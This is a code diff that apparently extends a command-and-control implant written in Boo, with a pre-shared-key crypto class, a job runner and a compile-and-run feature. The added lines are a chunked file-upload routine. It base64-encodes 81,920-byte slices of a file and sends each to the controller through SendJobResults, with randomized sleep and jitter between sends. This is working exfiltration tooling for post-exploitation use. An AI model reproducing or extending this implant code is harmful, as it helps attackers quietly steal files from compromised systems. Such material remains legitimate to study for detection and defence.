@@ -113,6 +113,14 @@ public class FileChunker:
 
         input.Read(buffer, 0, buffer.Length)
         return buffer
+    
+    public static def ReadBytes(input as (byte), chunk as int) as (byte):
+        if input.Length < 81920:
+            return input
+
+        start = 81920 * (chunk - 1)
+        end = start + 81920
+        return input[start:end]
 
 class Crypto:
     private _PSK as (byte)
@@ -326,6 +334,38 @@ class STJob:
             }
             Client.SendJobResults(self)
 
+        return "Sent File"
+
+    public def UploadAsBytes(source_file as (byte), filename as string) as string:
+        current_chunk_n = 1
+        chunk_n = source_file.Length / 81920
+        bytes_to_send = FileChunker.ReadBytes(source_file, current_chunk_n)
+        while bytes_to_send.Length == 81920:
+            if Client.Debug:
+                print "[*] Sending chunk $(current_chunk_n)/$(chunk_n), bytes remaining: $(source_file.Length - (bytes_to_send.Length * (current_chunk_n - 1)))"           
+            
+            result = {
+                "chunk_n": chunk_n,
+                "current_chunk_n": current_chunk_n,
+                "data": Convert.ToBase64String(bytes_to_send),
+                "filename": filename
+            }
+            Client.SendJobResults(self)
+            Thread.Sleep(Client.GetSleepAndJitter())
+
+            current_chunk_n += 1
+            bytes_to_send = FileChunker.ReadBytes(source_file, current_chunk_n)
+
+        if Client.Debug:
+            print "[*] Sending FINAL chunk $(current_chunk_n), bytes remaining: $(bytes_to_send.Length)" 
+
+        result = {
+            "chunk_n": chunk_n,
+            "current_chunk_n": current_chunk_n,
+            "data": Convert.ToBase64String(bytes_to_send),
+            "filename": filename
+        }
+        Client.SendJobResults(self)
         return "Sent File"
 
     public def CompileAndRun(source as string, references as List) as string:
